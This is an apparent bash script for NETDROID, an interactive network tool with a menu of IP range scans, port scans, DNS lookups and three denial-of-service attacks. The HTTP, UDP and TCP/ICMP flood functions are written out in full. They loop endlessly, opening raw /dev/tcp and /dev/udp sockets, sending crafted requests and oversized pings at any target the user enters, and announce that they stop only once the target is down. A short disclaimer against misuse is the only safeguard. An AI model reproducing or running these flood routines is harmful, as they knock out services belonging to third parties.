
RED='\033[0;31m'
Black='\033[0;30m'        
Red='\033[0;31m'          
Green='\033[0;32m'        
Yellow='\033[0;33m'       
Blue='\033[0;34m'       
Purple='\033[0;35m'       
Cyan='\033[0;36m'         
White='\033[0;37m'        
NC='\033[0m' 

function banner() {
clear
printf "${Blue}
 _   _ ______ _______ _____            _     _
| \ | |  ____|__   __|  __ \          (_)   | |v1.4
|  \| | |___    | |  | |  | |_ __ ___  _  __| |
| .   |  ___|   | |  | |  | |  __/ _ \| |/ _  |
| |\  | |____   | |  | |__| | | | (_) | | (_| |
|_| \_|______|  |_|  |_____/|_|  \___/|_|\__ _| by johnseu
codelink : https://github.com/Johnnseu/NETDROID
${NC}"
echo ""
}

function main() {
printf "${Green}[${NC}${Yellow}1${NC}${Green}]${NC}  ${Yellow}IP Range Scan ${NC}\n"
printf "${Green}[${NC}${Yellow}2${NC}${Green}]${NC}  ${Yellow}IP/Port Range Scan ${NC}\n"
printf "${Green}[${NC}${Yellow}3${NC}${Green}]${NC}  ${Yellow}Port Scan ${NC}\n"
printf "${Green}[${NC}${Yellow}4${NC}${Green}]${NC}  ${Yellow}DNSQuery ${NC}\n"  
printf "${Green}[${NC}${Yellow}5${NC}${Green}]${NC}  ${Yellow}ReverseDNSLookup${Cyan} (online)${NC}\n"
printf "${Green}[${NC}${Yellow}6${NC}${Green}]${NC}  ${Yellow}HTTP Flood ${NC}\n"
printf "${Green}[${NC}${Yellow}7${NC}${Green}]${NC}  ${Yellow}TCP/ICMP Flood ${NC}\n"
printf "${Green}[${NC}${Yellow}8${NC}${Green}]${NC}  ${Yellow}UDP Flood${NC}\n"
printf "${Green}[${NC}${Yellow}00${NC}${Green}]${NC} ${Yellow}exit${NC}\n"
echo ""
printf ">> "
read input 
  if [ "$input" = "0" ]; then
 echo "quiting" && exit 0
 elif [ "$input" = "1" ]; then
rangescan
 elif [ "$input" = "2" ]; then
ip-portscan
 elif [ "$input" = "3" ]; then
portscan
 elif [ "$input" = "4" ]; then
dns_query
 elif [ "$input" = "5" ]; then
r_dns
 elif [ "$input" = "6" ]; then
H_flood
 elif [ "$input" = "7" ]; then
TI_flood
 elif [ "$input" = "8" ]; then
u_flood
 elif [ " $input" = "00" ]; then
exit 0
  else
echo "wrong input"
clear
main
fi
}       
  

function rangescan() {
echo "Usage :
 scan 192.168.0.1 /255  :  This scans IP 192.168.0.1 to 192.168.0.255
     menu : returns to menu"
mnu
}
mnu() {
printf ">ping \n"
read  scan ip rmgs 
if [ "$scan" = "scan" ]; then
echo "Using ICMP scan protocol"
echo "Scan in progress, this may take some time"

range_ip() {
ping -c 1 -w 1 $1 >/dev/null 2>&1
[ $? -eq 0 ] && php ips.php $1 && msget $1
}
function msget() {
printf "${Cyan}ms: ";
ping -c 1 -w 1 $1 | sed '$!d;s|.*/\([0-9.]*\)/.*|\1|'
printf "${NC}\n";
}
oc1="$(cut -d'.' -f1 <<<"$ip")"
oc2="$(cut -d'.' -f2 <<<"$ip")"
oc3="$(cut -d'.' -f3 <<<"$ip")"
oc4="$(cut -d'.' -f4 <<<"$ip")"
rges="$(cut -d'/' -f2 <<<"$rmgs")"
for ip in $(seq $oc4 $rges); do
    range_ip $oc1.$oc2.$oc3.$ip
done

echo ""
echo "scan complete" && mnu aware
elif [ "$scan" = "menu" ]; then
main
else
echo "wrong input"
mnu
fi
}

function ip-portscan() {
echo "Usage :"
echo "      Example: scan <ip> /<range> port1"
echo "           scan 192.168.0.1 /255 80"
echo "Note: port limit is one" 
echo "menu : returns to menu"
pmnu
}
function pmnu() {
printf "${Yellow}scanR
|_ ${NC}"
read scb lip rges st 
if [ "$scb" = "scan" ]; then
printf "Using TCP connection Scan\n"
printf "Scan started\n"


ipc1="$(cut -d'.' -f1 <<<"$lip")"
ipc2="$(cut -d'.' -f2 <<<"$lip")"
ipc3="$(cut -d'.' -f3 <<<"$lip")"
ipc4="$(cut -d'.' -f4 <<<"$lip")"

cues="$(cut -d'/' -f2 <<<"$rges")"

for lp in $(seq $ipc4 $cues); do
    range_ipPort $ipc1.$ipc2.$ipc3.$lp
done
echo ""
echo "scan complete"
pmnu
elif [ "$scb" = "menu" ]; then
main
else
echo "wrong input"
pmnu
fi
}
range_ipPort() {
for pr in $st
do
bash tscan.sh $1 $pr > /dev/null 2>&1
[ $? -eq 0 ] && printf "HOST : ${Red}$1${NC} is up - LPORT: ${Cyan}$pr ${NC}\n"
done
}

function portscan() {
echo "Usage :
             <IP> <startport>-<endport> :example 
                                         192.168.43.1 1-1024"
./port_scan
echo "press c to goto main"
echo ">>"
read rdy
if [ "$rdy" = "c" ]; then
main
else 
main
fi 
}

function dns_query() {
echo ""
./dnsQ
echo "press c to goto main"
echo ">>"
read rdy
if [ "$rdy" = "c" ]; then
main
else
dns_query
fi
}

function H_flood() {
echo "WARNING: Please do not use to distrupt network that is not yours"
echo "you are responsible for any damages caused"
echo "by this tool."
echo ""
echo "NOTE: "
H-flood
}

H-flood() {
echo "input target ip or hostname"
echo "usage: set <target>"
printf "H-IP > "
read snd mIP
if [ "$snd" = "set" ]; then
CH-flood
else
echo "wrong input"
H-flood
fi 
}

CH-flood() {
echo "RECOMMENDED: Use port 80,443 for better per-"
echo "formance"
echo "usage: set PORT <port>"
printf "H-P > "
read smd pmd prt
if [ "$smd" = "set" ]; then
f-check
else
echo "wrong input"
H-flood
fi
}

f-check() {
if [ "$pmd" = "PORT" ]; then
HTTP-FLOOD
else
echo "wrong input"
CH-flood
fi
}

HTTP-FLOOD() {
printf "[${Yellow}*${NC}] ${Yellow}Testing target : $mIP if it surpport http${NC}\n"
curl http://$mIP/ > /dev/null 2>&1
 [ $? -eq 0 ] && printf "${Green}[+] Received valid response from target : $mIP ${NC}\n" && s_Hflood
 [ $? -eq 1 ] && printf "[${Red}-${NC}] Received invalid response from target : $mIP, Check port number or target dont support HTTP protocol.\n" && H-flood
}

s_Hflood() {
printf "use CTRL+c to terminate\n"
printf "This attack will stop as soon as the target is down.\n"
printf "${Green}Starting Attack on target :${NC}${Red} $mIP ${NC}${Green}target port :${NC}${Red} $prt${NC}\n"
httpf-bot
}
 
httpf-bot() {
printf "${Green} Attack Started${NC}\n"
while :
do
exec 3<>/dev/tcp/$mIP/$prt >/dev/null 2>&1
[ $? -eq 0 ] && echo -ne "GET / HTTP/1.0\r\nHost: $mIP\r\n\r\n" >&3 && echo -e 'POST / HTTP/1.1\r\nContent-Type: application/json\r\nHost: $mIP\r\nAccept-text/xml,text/html,text/plain\r\nAccept-Language: em-us,en\r\nAccept-Encoding: gzip, deflate\r\nAccept-Charset: ISO-8859-1,utf-8\r\nKeep-Alive: 300\r\nConnection:keep-alive\r\n\r\n{\r\n"name": "TFlood"\r\n}\r\n\r\n' >&3 && echo -ne "POST / HTTP/1.1\r\nHost: $mIP\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" >&3 && echo -e "GET / HTTP/1.1\r\nHost: $mIP\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n" >&3
[ $? -eq 1 ] && printf "${Yellow}Server not responding to requests${NC}\n" && H-flood
done
printf "${Green}Target : $mip is Down${NC}"
}


function u_flood() {
echo "WARNING: Please do not use this attack to distrupt network that is not yours"
echo "you are responsible for any damages caused"
echo "by this tool."
echo "Dont let any traffic monitor fool you, the packet size"
echo "transmitted by this tool is a lot higher than you think"
echo ""
U-Flood
}

U-Flood() {
echo "input target ip or hostname"
echo "usage: set <target>"
printf "U-IP > "
read sud UIP  
if [ "$sud" = "set" ]; then
CU-flood
else
echo "wrong input"
U-Flood 
fi
}

CU-flood() {
echo "This is a single port UDP flood"
echo "usage: set PORT <port>"
printf "U-P > "
read smdu pmdu uprt
if [ "$smdu" = "set" ]; then
u-check
else
echo "wrong input"
CU-flood
fi
}

u-check(){
if [ "$pmdu" = "PORT" ]; then
UDP-FLOOD
else
echo "wrong input"
CU-flood
fi
}

udpbot1() {
cat pkt/UDPH 
cat pkt/UDPH1 
cat pkt/UDPH2 
cat pkt/UDPH3
cat pkt/FUDPH 
cat pkt/UDPH2
cat pkt/UDPH2
cat pkt/UDPH3
cat pkt/FUDPH
cat pkt/UDPH3
cat pkt/UDPH2
}

uexec() {
exec 1<>/dev/udp/$UIP/$uprt
udpbot1 >&1
}

UDP-FLOOD() {
printf "use CTRL+c to terminate\n"
printf "This attack will stop as soon as the target is down\n"
printf "${Green}Starting Attack on target :${NC}${Red} $UIP ${NC}${Green}target port :${NC}${Red} $uprt${NC}\n"
printf "${Red}Attack Started${NC}\n"
while :
do

uexec > /dev/null 2>&1
 [ $? -eq 1 ] && printf "${Yellow} *SENT!${NC}\n"
done
}

function TI_flood() {
echo "WARNING: Please do not use this attack to distrupt network that is not yours"
echo "you are responsible for any damages caused"
echo "by this tool."
echo "Dont let any traffic monitor fool you, the packet size"
echo "transmitted by this tool is a lot higher than you think"
echo ""
T-fld
}

T-fld() {
echo "input target ip or hostname"
echo "usage: set <target>"
printf "T-IP > "
read st TIP
if [ "$st" = "set" ]; then
IT-flood
else
echo "wrong input"
T-fld
fi
}

IT-flood() {
echo "Please specify an Open Port on Target"
echo "usage: set PORT <port>"
printf "T-P > "
read smdt pmdt tprt
if [ "$smdt" = "set" ]; then
t-check
else
echo "wrong input"
IT-flood
fi
}
t-check() {
if [ "$pmdt" = "PORT" ]; then
TCP-FLOOD
else
echo "wrong input"
IT-flood
fi
}

TCP-FLOOD() {
printf "use CTRL+c to terminate\n"
printf "This attack uses both TCP and ICMP, so specify a open port on the target\n"
bash tscan.sh $TIP $tprt > /dev/null 2>&1
[ $? -eq 0 ] && TCP_sock
[ $? -eq 1 ] && printf "${Red} Error: Invalid port number or IP address${NC}\n" && T-fld

TCP_sock() {
exec 1<>/dev/tcp/$TIP/$tprt
exec 1<>/dev/tcp/$TIP/$tprt
exec 1<>/dev/tcp/$TIP/$tprt
exec 1<>/dev/tcp/$TIP/$tprt
exec 1<>/dev/tcp/$TIP/$tprt
ping -c 1 -s 65500 $TIP >&1
ping -c 1 -s 65507 $TIP >&1
}
printf "${Green}Starting Attack on target :${NC}${Red} $TIP ${NC}${Green}target port :${NC}${Red} $tprt ${NC}\n"
printf "${Red}Attack Started${NC}\n"
while :
do
TCP_sock > /dev/null 2>&1
[ $? -eq 1 ] && printf "${Yellow} !*SENT ${NC}\n"
done
}

function r_dns() {
echo "Only works when online"
echo "Usage: reverse-dns <IP>"
rmnu
}

rmnu() {
echo ">>"
read rcmd rdns
if [ "$rcmd" = "reverse-dns" ]; then
./reverse-dns $rdns
rmnu
elif [ "$rcmd" = "c" ]; then
main
else
rmnu
fi
}

banner
main
